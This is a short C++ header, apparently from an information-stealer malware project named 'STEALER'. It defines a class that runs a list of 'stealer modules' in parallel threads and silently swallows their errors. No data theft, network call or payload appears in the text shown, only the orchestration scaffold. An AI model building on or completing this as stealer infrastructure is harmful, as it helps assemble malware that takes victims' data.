//
// Created by .1qxz on 08.06.2024.
//

#ifndef STEALER_STEALERMODULEGROUP_H
#define STEALER_STEALERMODULEGROUP_H

#include "../Includes.h"
#include "StealerModule.h"
#include <thread>

class StealerModuleGroup {
protected:
    void execute(fs::path &modules_root) {
        std::vector<std::thread> threads;

        for(StealerModule* module : this->modules) {
            threads.emplace_back([module, &modules_root]() {
                try
                {
                    module->execute(modules_root);
                }
                catch (const std::exception& e)
                {
                    #if DEV
                        std::cerr << "DEBUG ERROR: " << e.what() << std::endl;
                    #endif
                }
                catch (...){}
            });
        }

        for(auto& thread : threads) {
            if (thread.joinable()) {
                thread.join();
            }
        }
    }

    std::list<StealerModule*> modules;
};

#endif //STEALER_STEALERMODULEGROUP_H
